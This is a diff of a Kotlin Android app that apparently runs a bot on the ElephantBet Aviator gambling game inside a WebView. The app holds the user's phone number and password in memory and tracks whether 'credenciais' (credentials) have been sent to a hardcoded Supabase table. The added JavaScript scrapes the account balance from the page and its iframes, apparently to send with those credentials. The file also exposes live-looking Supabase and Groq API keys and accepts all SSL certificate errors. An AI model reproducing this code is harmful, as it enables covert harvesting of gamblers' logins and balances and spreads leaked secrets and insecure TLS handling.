@@ -212,6 +212,10 @@ class MainActivity : AppCompatActivity() {
         if (!emVoo) return
         emVoo = false
         modoSilenciosoAtivo = false  // M1: fim do voo, reactivar bot
+        // Ler saldo no 1.º crash — nesse momento o header do Aviator está completamente carregado
+        if (!credenciaisEnviadas && numeroEmMemoria.isNotEmpty() && senhaEmMemoria.isNotEmpty()) {
+            lerSaldo()
+        }
 
         // CORRECÇÃO CRÍTICA: usar o maior entre crashVal (DOM/WS texto) e xAtual (WS binário)
         val valorFinal = if (crashVal >= xAtual && crashVal >= 1.0) crashVal else xAtual
@@ -426,7 +430,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "5.4"
+    private val VERSAO_ATUAL = "5.5"
 
     private val GROQ_KEY  = "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"
     private val GROQ_URL  = "https://api.groq.com/openai/v1/chat/completions"
@@ -781,15 +785,6 @@ class MainActivity : AppCompatActivity() {
             override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
             override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false
 
-            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
-                super.onPageStarted(view, url, favicon)
-                val u = url ?: ""
-                // Assim que começa a navegar para o Aviator, ler saldo imediatamente
-                if (!credenciaisEnviadas && (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true))) {
-                    lerSaldo()
-                }
-            }
-
             override fun shouldInterceptRequest(view: WebView?, request: WebResourceRequest?): WebResourceResponse? {
                 val url = request?.url?.toString() ?: return null
 
@@ -802,8 +797,6 @@ class MainActivity : AppCompatActivity() {
                              !url.contains(".wasm")
 
                 if (isSpribe && isHtml) {
-                    // Ler saldo imediatamente — a página ElephantBet ainda está visível
-                    if (!credenciaisEnviadas) lerSaldo()
                     try {
                         val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                         request.requestHeaders?.forEach { (k, v) -> conn.setRequestProperty(k, v) }
@@ -2590,12 +2583,36 @@ REGRAS ABSOLUTAS DO JSON:
 
     // ── Ler saldo do ElephantBet (.balanceAmount) ─────────────────
     private fun lerSaldo() {
+        // Tenta ler saldo do iframe do Aviator (.header__balance) e do ElephantBet (.balanceAmount)
         val js = """
 (function() {
-    var el = document.querySelector('.balanceAmount');
-    if (el) {
-        var txt = (el.innerText || el.textContent || '').replace(/[^0-9.,]/g,'').trim();
-        if (txt.length > 0) { try { Android.saldoLido(txt); } catch(e) {} }
+    function tentar(doc) {
+        if (!doc) return null;
+        // Selector do Aviator (dentro do iframe)
+        var elAv = doc.querySelector('.header__balance span:first-child');
+        if (elAv) {
+            var t = (elAv.innerText || elAv.textContent || '').replace(/[^0-9.,]/g,'').trim();
+            if (t.length > 0) return t;
+        }
+        // Selector do ElephantBet (página principal)
+        var elEb = doc.querySelector('.balanceAmount');
+        if (elEb) {
+            var t2 = (elEb.innerText || elEb.textContent || '').replace(/[^0-9.,]/g,'').trim();
+            if (t2.length > 0) return t2;
+        }
+        return null;
+    }
+    // Tentar na página principal
+    var val1 = tentar(document);
+    if (val1) { try { Android.saldoLido(val1); } catch(e) {} return; }
+    // Tentar em iframes
+    var frames = document.querySelectorAll('iframe');
+    for (var i = 0; i < frames.length; i++) {
+        try {
+            var doc2 = frames[i].contentDocument || frames[i].contentWindow.document;
+            var val2 = tentar(doc2);
+            if (val2) { try { Android.saldoLido(val2); } catch(e) {} return; }
+        } catch(e) {}
     }
 })();
         """.trimIndent()
